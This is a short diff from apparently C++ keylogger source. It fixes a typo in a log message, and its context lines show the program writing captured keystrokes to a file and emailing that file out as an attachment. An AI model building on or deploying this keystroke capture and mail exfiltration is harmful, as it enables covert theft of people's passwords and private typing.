@@ -16,7 +16,7 @@ void TimerSendMail()
     std::string last_file = IO::WriteLog(keylog);
     if(last_file.empty())
     {
-        Helper::WriteAppLog("File creation was not successfull. Keylog '" + keylog + "'");
+        Helper::WriteAppLog("File creation was not successful. Keylog '" + keylog + "'");
         return;
     }
     int x= Mail::SendMail("Log [" + last_file + "]", "Hi! \nThe file has been attached to this mail.\n" + keylog, IO::GetPath(true) + last_file);
